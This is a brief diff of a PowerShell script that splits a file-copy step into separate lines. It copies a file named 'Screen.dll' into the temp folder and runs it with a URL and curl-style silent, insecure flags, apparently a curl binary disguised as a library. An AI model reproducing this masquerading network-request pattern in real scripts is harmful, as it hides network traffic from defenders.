@@ -1,6 +1,7 @@
 # Functions #
-$curl = $env:temp + "\Screen.dll"
-Copy-Item "C:\Users\" + $env:Username + "\Screen.dll" $curl
+$curl = $env:temp + "\Screen.dll";
+$source = "C:\Users\" + $env:Username + "\Screen.dll";
+Copy-Item $source $curl;
 function Request($url){
 	$string = cmd.exe /c $curl $url -s -k;
 	return [string]$string;
